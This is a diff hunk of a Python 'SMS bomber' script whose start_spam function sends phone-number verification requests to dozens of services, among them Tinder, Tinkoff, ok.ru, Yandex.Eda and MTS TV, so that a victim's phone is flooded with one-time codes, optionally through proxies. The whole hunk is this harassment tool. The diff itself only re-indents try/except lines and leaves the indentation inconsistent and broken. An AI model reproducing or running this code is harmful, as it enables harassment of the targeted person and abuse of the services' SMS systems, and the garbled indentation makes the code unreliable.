@@ -683,130 +683,130 @@ def start_spam(phone, proxies):
             post("https://apteka.ru/_action/auth/getForm/", data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "", "form[LOGIN]": formatted_phone, "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS", "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple", "utc_offset": "120"}, headers=headers, proxies=proxies)
         except:
             pass
- try:
+        try:
         requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, headers=HEADERS)
         print('SunLight: отправлено')
-    except:
+        except:
         print('SunLight: не отправлено')
 
-    try:
+        try:
         requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": phone_plus, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
         print('iCloud: отправлено')
-    except:
+        except:
         print('iCloud: не отправлено')
 
-    try:
+        try:
     	requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone8}, headers=HEADERS)
     	print('Utair: отправлено')
-    except:
+        except:
         print('Utair: не отправлено')
 
-    try:
+        try:
         requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":phone}, headers=HEADERS)
         print('Tinder: отправлено')
-    except:
+        except:
         print('Tinder: не отправлено')
-
-    try:
+ 
+        try:
         requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": phone_plus}, headers=HEADERS)
         print('Одноклассники: отправлено')
-    except:
+        except:
         print('Одноклассники: не отправлено')
 
-    try:
-    	requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":phone}, headers=HEADERS)
+        try:
+     	requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":phone}, headers=HEADERS)
     	print('Карусель: отправлено')
-    except:
+        except:
         print('Карусель: не отправлено')
 
-    try:
+        try:
         requests.post('https://youdrive.today/login/web/phone', data = {'phone': phone9, 'phone_code': '7'},headers=HEADERS)
         print('YouDrive: отправлено')
-    except:
+        except:
         print('YouDrive: не отправлено')
 
-    try:
+        try:
     	requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers=HEADERS)
     	print('MTS TV: отправлено')
-    except:
+        except:
         print('MTS TV: не отправлено')
 
-    try:
+        try:
     	requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone_plus}, headers=HEADERS)
     	print('Юла: отправлено')
-    except:
+        except:
         print('Юла: не отправлено')
 
-    try:
+        try:
         requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone}, headers=HEADERS)
         print('Яндекс.Еда: не отправлено')
-    except:
+        except:
         print('Яндекс.Еда: не отправлено')
 
-    try:
+        try:
         requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": phone}, headers=HEADERS)
         print('IVI: отправлено')
-    except:
+        except:
         print('IVI: не отправлено')
 
-    try:
+        try:
         requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=HEADERS)
         print('DeliTime: отправлено')
-    except:
+        except:
         print('DeliTime: не отправлено')
 
-    try:
+        try:
         requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
         print('ICQ: отправлено')
-    except:
+        except:
         print('ICQ: не отправлено')
 
-    try:
+        try:
         requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
         print('Grabaxi: отправлено')
-    except:
+        except:
         print('GrabTaxi: не отправлено')
 
-    try:
+        try:
         requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()['res']
         print('RuTaxi: отправлено')
-    except:
+        except:
         print('RuTaxi: не отправлено')
 
-    try:
+        try:
         requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': phone_plus}, headers={})
         print('Tinkoff: отправлено')
-    except:
+        except:
         print('Tinkoff: не отправлено')
 
-    try:
+        try:
         requests.post('https://www.rabota.ru/remind', data={'credential': phone})
         print('Работа: отправлено')
-    except:
+        except:
         print('Работа: не отправлено')
 
-    try:
+        try:
         requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': phone_plus})
         print('Rutube: отправлено')
-    except:
+        except:
         print('Rutube: не отправлено')
 
-    try:
+        try:
         requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
         print('Smsint: отправлено')
-    except:
+        except:
         print('Smsint: не отправлено')
 
-    try:
+        try:
         requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone9 + '&country_code=%2B7&nod=4&locale=en')
         print('Oyorooms: отправлено')
-    except:
+        except:
         print('Oyorooms: не отправлено')
 
-    try:
+        try:
         requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
         print('Мвидео: отправлено')
-    except:
+        except:
         print('Мвидео: не отправлено')
 
     try:
